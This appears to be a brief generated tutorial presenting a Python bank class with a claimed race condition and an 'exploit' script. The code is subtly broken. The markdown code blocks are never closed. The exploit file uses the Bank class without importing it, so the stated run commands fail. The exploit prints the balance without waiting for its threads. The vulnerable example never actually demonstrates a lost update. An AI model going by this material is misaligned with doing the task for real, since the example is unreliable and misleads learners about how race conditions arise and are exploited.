# Vulnerable Code and Exploit for Race Condition

## Vulnerable Code
The following Python script demonstrates a race condition vulnerability in a bank deposit and withdrawal system.

```python
import threading
import time

class Bank:
    def __init__(self):
        self.balance = 0

    def deposit(self, amount):
        self.balance += amount
        time.sleep(0.1)  # simulate some processing time
        print(f"Deposited ${amount}. New balance: ${self.balance}")

    def withdraw(self, amount):
        if self.balance >= amount:
            self.balance -= amount
            time.sleep(0.1)  # simulate some processing time
            print(f"Withdrew ${amount}. New balance: ${self.balance}")
        else:
            print("Insufficient funds")

def vulnerable_transaction():
    bank = Bank()
    threads = []
    for _ in range(10):  # create multiple threads
        t = threading.Thread(target=bank.deposit, args=(100,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("Final balance:", bank.balance)

vulnerable_transaction()


## Exploit Code
The following Python script exploits the race condition in the vulnerable code.

```python
import threading

class ExploitBank:
    def __init__(self, bank):
        self.bank = bank

    def exploit(self):
        for _ in range(10):  # create multiple threads
            t = threading.Thread(target=self.bank.deposit, args=(100,))
            t.start()

        for _ in range(10):  # create multiple threads
            t = threading.Thread(target=self.bank.withdraw, args=(200,))
            t.start()

        print("Exploited balance:", self.bank.balance)

bank = Bank()
exploit_bank = ExploitBank(bank)
exploit_bank.exploit()



## How to Run
To run the vulnerable code:
python bank.py

To run the exploit code:
python exploit.py
